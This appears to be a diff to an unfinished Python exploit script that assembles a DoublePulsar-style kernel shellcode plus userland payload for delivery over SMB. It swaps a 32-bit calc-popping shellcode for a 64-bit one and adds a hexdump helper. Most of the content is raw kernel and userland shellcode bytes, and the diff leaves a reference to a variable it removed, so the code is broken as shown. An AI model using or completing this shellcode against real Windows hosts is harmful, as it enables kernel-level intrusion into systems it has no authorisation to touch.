@@ -45,6 +45,27 @@ def read_dll_file_as_hex():
         print('File size: {:d}'.format(len(data)))
     return data
 
+def hexdump(src, length=16, sep='.'):
+    """Hex dump bytes to ASCII string, padded neatly
+    In [107]: x = b'\x01\x02\x03\x04AAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB'
+
+    In [108]: print('\n'.join(hexdump(x)))
+    00000000  01 02 03 04 41 41 41 41  41 41 41 41 41 41 41 41 |....AAAAAAAAAAAA|
+    00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 42 42 |AAAAAAAAAAAAAABB|
+    00000020  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42 |BBBBBBBBBBBBBBBB|
+    00000030  42 42 42 42 42 42 42 42                          |BBBBBBBB        |
+    """
+    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])
+    lines = []
+    for c in range(0, len(src), length):
+        chars = src[c: c + length]
+        hex_ = ' '.join(['{:02x}'.format(x) for x in chars])
+        if len(hex_) > 24:
+            hex_ = '{} {}'.format(hex_[:24], hex_[24:])
+        printable = ''.join(['{}'.format((x <= 127 and FILTER[x]) or sep) for x in chars])
+        lines.append('{0:08x}  {1:{2}s} |{3:{4}s}|'.format(c, hex_, length * 3, printable, length))
+    return lines
+
 kernel_shellcode = b"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
 kernel_shellcode += b"\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2"
 kernel_shellcode += b"\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8\x65\x48\x89\x24\x25\x10"
@@ -111,20 +132,13 @@ kernel_shellcode += b"\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x
 kernel_shellcode += b"\x5E\xC3"
 
 # pop calculator shellcode - this is a sample.  Change according to your payload
-userland_shellcode = b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
-userland_shellcode += b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
-userland_shellcode += b"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
-userland_shellcode += b"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
-userland_shellcode += b"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
-userland_shellcode += b"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
-userland_shellcode += b"\x45\x81\x3e\x43\x72\x65\x61\x75"
-userland_shellcode += b"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
-userland_shellcode += b"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
-userland_shellcode += b"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
-userland_shellcode += b"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
-userland_shellcode += b"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
-userland_shellcode += b"\x6c\x63\x89\xe2\x52\x52\x53\x53"
-userland_shellcode += b"\x53\x53\x53\x53\x52\x53\xff\xd7"
+payload_shellcode = b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
+payload_shellcode += b"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
+payload_shellcode += b"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
+payload_shellcode += b"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
+payload_shellcode += b"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
+payload_shellcode += b"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
+payload_shellcode += b"\x48\x83\xec\x20\x41\xff\xd6"
 
 if __name__ == "__main__":
     # Packets
@@ -216,17 +230,19 @@ if __name__ == "__main__":
         modified_kernel_shellcode = bytearray(kernel_shellcode)
 
         #add PAYLOAD shellcode length in bytes after the kernel shellcode and write this value
-        str_val = str(hex(len(userland_shellcode)))
-        my_str_as_bytes = str.encode(str_val)
-        bytesarray_append = bytearray(my_str_as_bytes)
-        modified_kernel_shellcode += bytesarray_append
+        payload_shellcode_size = len(payload_shellcode)
+        value = struct.pack('<H', payload_shellcode_size)
+        modified_kernel_shellcode += value
 
         #convert userland shellcode to bytearray
         payload_shellcode = bytearray(userland_shellcode)
 
         #add the userland shellcode after the shellcode size
         modified_kernel_shellcode += payload_shellcode
-
+        
+        #hexdump the modified kernel shellcode
+        print(hexdump(modified_kernel_shellcode))
+        
         # fill up the SMB Trans2 Secondary packet structures
         # CODE IS NOT FINISHED HERE
         # helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
